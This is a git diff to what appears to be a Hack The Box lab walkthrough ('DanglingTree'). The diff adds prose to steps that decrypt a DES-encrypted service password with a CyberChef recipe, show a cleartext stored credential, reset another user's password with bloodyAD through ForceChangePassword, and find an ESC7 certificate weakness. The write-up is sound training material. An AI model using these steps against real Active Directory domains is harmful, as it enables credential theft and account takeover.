@@ -167,11 +167,11 @@ in the settings.json file of the user `noah.b`, the encrypted password can be fo
 
 <figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 13.52.59.png" alt=""><figcaption></figcaption></figure>
 
-In order to decrypt this (this is a 3DES encryption method) we utilize `dnspy` to read out the&#x20;
+In order to decrypt this (this is a 3DES encryption method) we utilize `dnspy` to read out the iv key that is used to encrypt/decrypt the password.
 
 <figure><img src="../../.gitbook/assets/screenshot_DES.png" alt=""><figcaption></figcaption></figure>
 
-<...>
+what we do, is retrieve the hexadecimal value of the keys, which can be found underneath
 
 ```powershell
 PS C:\Users\commando\desktop\HTB_DANGLINGTREE > python3 -c 'print(bytes([180, 63, 132, 209, 16, 180, 233, 145]).hex())'
@@ -181,17 +181,11 @@ PS C:\Users\commando\desktop\HTB_DANGLINGTREE > python3 -c 'print(bytes([ 1, 216
 01d8aee649ad9227
 ```
 
-
-
-<...>
+And use CyberChef to create a recipe in order to decrypt the DES encrypted password. First from base64, and lastly from the DES. This results in a valid password as the user `noah.b`.&#x20;
 
 {% embed url="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)DES_Decrypt(%7B'option':'Hex','string':'b43f84d110b4e991'%7D,%7B'option':'Hex','string':'01d8aee649ad9227'%7D,'CBC','Raw','Raw')&input=NjZlN3BwTE9CRjdVZHpEdjd6SzZNSjFybXlVYjFDYnk&oeol=FF" %}
 
-***
-
 <figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 13.57.13.png" alt=""><figcaption></figcaption></figure>
-
-
 
 > as svc\_mail
 
@@ -235,22 +229,18 @@ Folder       : C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\
     Credential       : SunsetMountainPeak@2025 # <-- password of alex.o
 ```
 
-
-
-<...>
+BloodHound shows that the user alex.o has ForceChangePassword rights over the user jake.h. By abusing this, we can reset the password and gain access to the jake.h account.
 
 <figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 14.18.24.png" alt=""><figcaption></figcaption></figure>
 
-<...>
+use bloody-ad to force change the password
 
 ```bash
 # force change the password of the user jake.h to testTEST12!@
 bloodyAD --host '10.129.68.2' -d 'danglingtree.htb' -u 'alex.o' -p 'SunsetMountainPeak@2025' set password 'jake.h' 'testTEST12!@'
 ```
 
-
-
-<...>
+Once the force change password has happened, we run certipy. It can be seen that there is a ESC7 vulnerability present in the environment.
 
 <figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 14.31.13.png" alt=""><figcaption></figcaption></figure>
 
